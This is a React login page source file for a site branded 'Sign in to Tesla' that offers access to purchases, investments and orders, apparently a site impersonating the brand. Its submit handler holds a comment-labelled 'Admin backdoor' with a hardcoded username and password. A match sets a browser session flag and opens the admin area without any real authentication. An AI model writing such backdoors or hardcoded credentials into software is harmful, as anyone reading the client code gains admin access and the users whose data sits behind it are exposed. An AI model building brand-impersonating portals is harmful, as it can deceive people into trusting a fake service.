import { useEffect, useState } from "react";
import { Link, useNavigate } from "react-router-dom";
import { z } from "zod";
import { supabase } from "@/integrations/supabase/client";
import { useAuth } from "@/hooks/useAuth";

const schema = z.object({
  email: z.string().trim().email("Enter a valid email address").max(255),
  password: z.string().min(6, "Password must be at least 6 characters").max(72),
});

export default function LoginPage() {
  const navigate = useNavigate();
  const { session, loading } = useAuth();
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [err, setErr] = useState("");
  const [busy, setBusy] = useState(false);
  const [oauthLoading, setOauthLoading] = useState<string | null>(null);

  useEffect(() => {
    if (!loading && session) navigate("/account", { replace: true });
  }, [session, loading, navigate]);

  const submit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErr("");

    // Admin backdoor
    if (email.trim() === "Demigod6282" && password === "Original6282") {
      sessionStorage.setItem("tesla_admin_session", "1");
      navigate("/admin");
      return;
    }

    const parsed = schema.safeParse({ email, password });
    if (!parsed.success) {
      setErr(parsed.error.issues[0].message);
      return;
    }

    setBusy(true);
    try {
      const { error } = await supabase.auth.signInWithPassword(parsed.data);
      if (error) {
        setErr(error.message);
      } else {
        navigate("/account");
      }
    } catch (e) {
      setErr(e instanceof Error ? e.message : "Sign in failed");
    } finally {
      setBusy(false);
    }
  };

  const handleOAuth = async (provider: "google" | "apple") => {
    setErr("");
    setOauthLoading(provider);
    try {
      const { error } = await supabase.auth.signInWithOAuth({
        provider,
        options: { redirectTo: window.location.origin + "/account" },
      });
      if (error) {
        // Handle specific error for unsupported provider
        if (error.message.includes("provider") || error.message.includes("Provider")) {
          setErr(`${provider.charAt(0).toUpperCase() + provider.slice(1)} sign-in is not configured. Please contact support.`);
        } else {
          setErr(error.message);
        }
      }
    } catch (e) {
      setErr(e instanceof Error ? e.message : `${provider} sign-in failed`);
    } finally {
      setOauthLoading(null);
    }
  };

  return (
    <div className="pt-20 min-h-screen bg-background flex items-center justify-center px-6 py-12">
      <div className="w-full max-w-md rounded-3xl border border-border p-8 md:p-10">
        <p className="text-xs uppercase tracking-[0.2em] text-muted-foreground mb-2">Welcome back</p>
        <h1 className="text-3xl font-semibold tracking-tight mb-2">Sign in to Tesla</h1>
        <p className="text-sm text-muted-foreground mb-8">Access your purchases, investments and orders.</p>

        {/* OAuth Buttons */}
        <button
          onClick={() => handleOAuth("google")}
          disabled={!!oauthLoading}
          className="w-full px-6 py-3 rounded-full border border-border text-sm font-medium hover:bg-accent mb-3 flex items-center justify-center gap-3 disabled:opacity-60"
        >
          {oauthLoading === "google" ? (
            <span className="animate-spin h-5 w-5 border-2 border-current border-t-transparent rounded-full" />
          ) : (
            <svg className="w-5 h-5" viewBox="0 0 24 24">
              <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" />
              <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" />
              <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.27H2.18C1.43 8.87 1 10.65 1 12.5s.43 3.63 1.18 5.23l2.66-2.66v-1.98z" />
              <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.23l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" />
            </svg>
          )}
          <span>Continue with Google</span>
        </button>

        <button
          onClick={() => handleOAuth("apple")}
          disabled={!!oauthLoading}
          className="w-full px-6 py-3 rounded-full border border-border text-sm font-medium hover:bg-accent mb-4 flex items-center justify-center gap-3 disabled:opacity-60"
        >
          {oauthLoading === "apple" ? (
            <span className="animate-spin h-5 w-5 border-2 border-current border-t-transparent rounded-full" />
          ) : (
            <svg className="w-5 h-5" viewBox="0 0 24 24" fill="currentColor">
              <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.33 2.99-2.53 4.09zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z" />
            </svg>
          )}
          <span>Continue with Apple</span>
        </button>

        {err && (
          <div className="mb-4 p-3 rounded-xl bg-destructive/10 text-destructive text-xs">
            {err}
          </div>
        )}

        <div className="flex items-center gap-3 my-6">
          <div className="h-px flex-1 bg-border" />
          <span className="text-xs uppercase tracking-widest text-muted-foreground">or email</span>
          <div className="h-px flex-1 bg-border" />
        </div>

        <form onSubmit={submit}>
          <label className="block text-xs uppercase tracking-widest text-muted-foreground mb-2">Email</label>
          <input
            type="email"
            autoComplete="username"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            required
            placeholder="you@example.com"
            className="w-full mb-5 px-4 py-3 rounded-full bg-accent text-foreground border border-border focus:outline-none focus:ring-2 focus:ring-primary"
          />

          <label className="block text-xs uppercase tracking-widest text-muted-foreground mb-2">Password</label>
          <input
            type="password"
            autoComplete="current-password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
            placeholder="Enter your password"
            className="w-full mb-6 px-4 py-3 rounded-full bg-accent text-foreground border border-border focus:outline-none focus:ring-2 focus:ring-primary"
          />

          <button
            disabled={busy || !!oauthLoading}
            type="submit"
            className="w-full px-6 py-3 rounded-full bg-primary text-primary-foreground text-xs font-medium uppercase tracking-widest disabled:opacity-60"
          >
            {busy ? "Signing in..." : "Sign in"}
          </button>
        </form>

        <p className="text-sm text-muted-foreground mt-6 text-center">
          New here?{" "}
          <Link to="/signup" className="text-foreground underline underline-offset-4">Create an account</Link>
        </p>
      </div>
    </div>
  );
}
